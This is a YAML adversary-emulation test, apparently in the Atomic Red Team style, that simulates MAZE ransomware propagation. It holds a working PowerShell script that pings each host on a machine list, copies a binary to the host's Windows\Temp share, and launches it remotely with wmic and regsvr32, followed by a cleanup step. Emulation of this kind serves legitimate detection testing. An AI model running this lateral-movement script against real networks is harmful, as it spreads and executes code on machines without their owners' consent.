api_version: "2.0"
name: MAZE Propagation Script
description: "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n"
args:
    - name: exe_remote_folder
      type: string
      default: \Windows\Temp\T1105.exe
    - name: remote_drive_letter
      type: string
      default: C
    - name: binary_file
      type: string
      default: $env:comspec
uuid: 70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1105: Ingress Tool Transfer'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Binary file must exist at specified location (#{binary_file})
      inline: |
        if (Test-Path #{binary_file}) {exit 0} else {{write-host "The binary_file input parameter must be set to a binary that exists on this computer."
        }}
      executor: powershell
    - name: |
        Machine list must exist at specified location ("PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt")
      inline: |
        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        new-item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt" | Out-Null
        echo "A machine list file has been generated at "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt". Please enter the machines to target there, one machine per line."
        }}
      executor: powershell
    - name: maze-propagation-script
      inline: "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"{{.Args.binary_file}}\" \"\\\\$machine\\{{.Args.remote_drive_letter}}${{.Args.exe_remote_folder}}\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i {{.Args.remote_drive_letter}}:{{.Args.exe_remote_folder}}\"}\nelse\n{echo $machine >> \"$offline_list\"}}\n"
      executor: powershell
      cleanup:
        inline: "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\{{.Args.remote_drive_letter}}${{.Args.exe_remote_folder}}\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue\n"
        executor: powershell
